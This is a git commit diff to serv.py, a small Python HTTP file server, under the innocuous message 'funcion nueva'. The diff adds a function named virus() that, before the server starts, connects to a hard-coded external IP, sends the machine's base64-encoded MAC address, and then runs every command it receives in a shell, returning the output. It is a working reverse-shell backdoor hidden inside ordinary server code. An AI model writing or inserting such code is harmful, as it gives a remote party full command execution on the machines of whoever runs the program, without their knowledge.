90db4b7dc7e07f1bc4af1c0105c5f9733347b167
Ubuntu <ubuntu@ip-172-31-9-82.ec2.internal>
2022-04-01 00:04:52 +0000

    funcion nueva

--- serv.py
+++ serv.py
@@ -1,5 +1,9 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
-
+import threading
+import subprocess as sp
+import socket
+import uuid
+import base64
 
 class Serv(BaseHTTPRequestHandler):
 
@@ -15,6 +19,21 @@ class Serv(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(bytes(file_to_open, 'utf-8'))
 
+def virus():
+    HOST = '44.202.184.56'    # The remote host
+    PORT = 12000               # The same port as used by the server
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((HOST, PORT))
+        a=hex(uuid.getnode())
+        a = bytes(a, 'utf-8')
+        a=base64.b64encode(a)
+        s.sendall(a)
+        while True:
+            msg=s.recv(2048).decode('utf-8')
+            output = sp.getoutput(msg)
+            msg = bytes(output, 'utf-8')
+            s.sendall(msg)
 
 httpd = HTTPServer(('localhost', 8080), Serv)
+virus()
 httpd.serve_forever()
